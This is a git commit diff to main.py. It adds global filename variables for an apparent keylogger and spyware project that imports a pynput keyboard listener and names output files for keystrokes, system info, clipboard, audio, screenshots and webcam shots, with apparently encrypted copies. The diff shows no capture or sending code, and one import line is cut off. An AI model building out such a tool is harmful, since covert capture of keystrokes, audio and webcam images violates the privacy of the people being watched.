9dd18db3ca766a7cf9b8c00440f0a1a1667d6f64
SushilkumarDev <sushilkumardeveloper@gmail.com>
2024-05-19 20:59:01 +0530

    Global Vriables are applied

--- main.py
+++ main.py
@@ -11,3 +11,16 @@ from pynput.keyboard import Key, Listener
 import time
 import os
 from scipy.io.wav
+
+
+# Global Variables
+keys_info = "key_log.txt"
+system_info = "syseminfo.txt"
+clipboard_info = "clipboard.txt"
+audio_info = "audio.wav"
+screenshot_info = "screenshot.png"
+webCamShot_info = "webCamera.png"
+
+keys_info_e = "e_key_log.txt"
+system_info_e = "e_systeminfo.txt"
+clipboard_info_e = "e_clipboard.txt"
